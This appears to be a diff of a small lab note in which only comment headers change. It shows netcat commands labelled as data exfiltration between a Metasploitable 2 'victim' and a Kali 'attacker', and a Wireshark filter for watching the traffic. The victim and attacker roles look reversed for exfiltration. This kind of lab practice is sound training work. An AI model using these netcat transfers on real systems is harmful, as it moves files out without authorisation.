@@ -1,8 +1,8 @@
-# On Victim Machine (Metasploitable 2) - Listening
+## On Victim Machine (Metasploitable 2) - Listening
 nc -l -p 1234 > /tmp/exfiltrated_data.txt
 
-# On Attacker Machine (Kali Linux) - Sending
+## On Attacker Machine (Kali Linux) - Sending
 nc <victim-ip> 1234 < sensitive_file.txt
 
-# Wireshark Capture Filter
+## Wireshark Capture Filter
 tcp.port == 1234
